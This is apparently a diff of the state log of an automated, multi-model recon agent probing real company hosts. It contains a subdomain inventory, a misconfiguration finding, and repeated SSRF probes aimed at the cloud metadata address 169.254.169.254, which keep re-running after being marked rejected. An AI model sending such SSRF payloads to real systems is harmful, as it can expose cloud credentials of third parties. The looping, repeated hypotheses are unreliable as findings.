@@ -249,6 +249,7 @@ probe_allow: "duocircle|autospf|dmarcreport|phishprotection|outboundsmtp|tenantm
 - 2026-08-22 ACCEPTED MISCONFIG @ admin.dealertrack.com: CA Access Gateway redirect leaks REALMOID, SMAGENTNAME, TARGET params (reconfirmed).
 - 2026-08-23 REJECTED SSRF @ https://docker-registry.docker
 - 2026-08-24 REJECTED SSRF @ https://docker-registry.docker
+- 2026-08-25 REJECTED SSRF @ https://docker-registry.docker
 === REAL SUBDOMAIN INVENTORY (from passive CT recon — PROBE/ANALYZE THESE, DO NOT INVENT HOSTS) ===
 0190c2c9-dd44-d440-0f97-f3b3bf073d0f.share.connect.posit.cloud
 01912861-8be7-59e2-215a-cdeffdd549f2.share.connect.posit.cloud
@@ -804,7 +805,6 @@ https://status.duocircle.com [[35mHSTS[0m]
 === MY STATE ===
 {"phase":"RECON"}
 === MY LAST LEADS (tail) ===
-## 2026-08-23 04:11:18 UTC (model mimo)
 ## 2026-08-23 05:03:53 UTC (model mimo)
 ## 2026-08-23 05:38:43 UTC (model mimo)
 ## 2026-08-23 06:51:20 UTC (model mimo)
@@ -864,13 +864,8 @@ https://status.duocircle.com [[35mHSTS[0m]
 ## 2026-08-24 22:56:27 UTC (model mimo)
 ## 2026-08-24 23:27:25 UTC (model mimo)
 ## 2026-08-24 23:49:15 UTC (model mimo)
+## 2026-08-25 01:39:12 UTC (model mimo)
 === AGGREGATED HYPOTHESES (tail) ===
-- (no NEW hypotheses this cycle — all deduped)
-- NEXT(hypotheses-qwen14b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
-- NEXT(hypotheses-qwen8b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
-- LEARN: REJECTED SSRF @ https://docker-registry.docker
-
-## RANKED HYPOTHESES 2026-08-24 21:35:27 UTC
 - (no NEW hypotheses this cycle — all deduped)
 - NEXT(hypotheses-qwen14b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
 - NEXT(hypotheses-qwen8b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
@@ -905,14 +900,13 @@ https://status.duocircle.com [[35mHSTS[0m]
 - NEXT(hypotheses-qwen14b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
 - NEXT(hypotheses-qwen8b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
 - LEARN: REJECTED SSRF @ https://docker-registry.docker
-=== LATEST ROBOT PROBE RESULTS ===
-https://api.coxautoinc.com/endpoint?param=admin -> HTTP 403
-https://github.com/posit/.github/workflows -> HTTP 404
-https://docker-registry.docker.com/v2/?param=http://169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
-https://api.coxautoinc.com/endpoint?param=admin&token=123 -> HTTP 403
 
-## 2026-08-24 19:58:47 UTC
-https://docker-registry.docker.com/v2/?param=169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
+## RANKED HYPOTHESES 2026-08-25 01:39:22 UTC
+- (no NEW hypotheses this cycle — all deduped)
+- NEXT(hypotheses-qwen14b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
+- NEXT(hypotheses-qwen8b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
+- LEARN: REJECTED SSRF @ https://docker-registry.docker
+=== LATEST ROBOT PROBE RESULTS ===
 https://api.coxautoinc.com/endpoint?param=admin -> HTTP 403
 https://github.com/posit/.github/workflows -> HTTP 404
 https://docker-registry.docker.com/v2/?param=http://169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
@@ -961,6 +955,13 @@ https://docker-registry.docker.com/v2/?param=http://169.254.169.254 -> ERR <urlo
 https://api.coxautoinc.com/endpoint?param=admin&token=123 -> HTTP 403
 
 ## 2026-08-24 23:49:26 UTC
+https://docker-registry.docker.com/v2/?param=169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
+https://api.coxautoinc.com/endpoint?param=admin -> HTTP 403
+https://github.com/posit/.github/workflows -> HTTP 404
+https://docker-registry.docker.com/v2/?param=http://169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
+https://api.coxautoinc.com/endpoint?param=admin&token=123 -> HTTP 403
+
+## 2026-08-25 01:39:22 UTC
 https://docker-registry.docker.com/v2/?param=169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
 https://api.coxautoinc.com/endpoint?param=admin -> HTTP 403
 https://github.com/posit/.github/workflows -> HTTP 404
